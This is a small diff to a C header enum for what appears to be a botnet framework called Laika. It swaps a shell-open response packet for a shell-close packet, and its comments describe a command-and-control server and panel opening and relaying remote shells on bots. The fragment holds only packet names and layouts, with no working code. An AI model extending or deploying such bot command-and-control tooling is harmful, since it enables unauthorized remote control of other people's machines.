@@ -84,9 +84,9 @@ enum {
     /* layout of LAIKAPKT_AUTHENTICATE_OPEN_SHELL_REQ
     *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
     */
-    LAIKAPKT_AUTHENTICATED_SHELL_OPEN_RES, /* panel requesting cnc open a shell on bot */
-    /* layout of LAIKAPKT_AUTHENTICATE_OPEN_SHELL_REQ
-    *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
+    LAIKAPKT_AUTHENTICATED_SHELL_CLOSE, /* peer requesting close their currently opened shell (accepted by both cnc & panel) */
+    /* layout of LAIKAPKT_AUTHENTICATED_SHELL_CLOSE_REQ:
+    *   NULL (empty packet)
     */
     LAIKAPKT_AUTHENTICATED_SHELL_DATA, /* if sent to cnc, writes data to stdin of shell. if sent to panel, writes to 'stdout' of shell */
     /* layout of LAIKAPKT_SHELL_DATA
